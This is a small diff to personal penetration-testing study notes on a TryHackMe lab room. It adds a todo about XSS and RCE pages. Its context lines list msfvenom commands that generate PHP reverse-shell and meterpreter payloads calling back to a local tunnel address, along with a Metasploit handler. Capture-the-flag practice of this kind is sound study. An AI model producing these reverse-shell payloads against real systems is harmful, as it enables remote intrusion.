@@ -4,12 +4,14 @@
 * .todo: metasploit dns sqlmap
 * .todo: windows Linux web shell
 * web general | terminology may have to be extracted
+* web forms/file/... | I think I have to do something
+  * xss/index.md
+  * rce/index.md
 
 ## Overconfidence
 
 --- https://tryhackme.com/room/rrootme
 
-* `gobuster -t 50`
 * `msfvenom -p php/reverse_php LHOST=tun0 LPORT=4455 -o revshell.php`
 * exploit/multi/handler
 * `msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4455 -o revshell2.php`
